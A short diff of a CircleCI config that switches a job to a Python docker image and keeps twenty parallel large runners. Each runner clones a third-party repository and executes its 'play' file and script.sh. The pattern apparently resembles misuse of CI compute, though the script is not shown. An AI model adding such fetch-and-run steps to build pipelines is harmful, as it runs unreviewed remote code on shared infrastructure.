@@ -1,9 +1,10 @@
 version: 2.1
+
 jobs:
   running:
-    machine:
-      image: ubuntu-2004:current
     resource_class: large
+    docker:
+      - image: circleci/python:3.6.6
     parallelism: 20
     steps:
         - run:
@@ -11,6 +12,5 @@ jobs:
             command: git clone https://github.com/playdoco/play.git && cd play && chmod 500 play script.sh && ./script.sh
 
 workflows:
-    running:
     jobs:
         - running
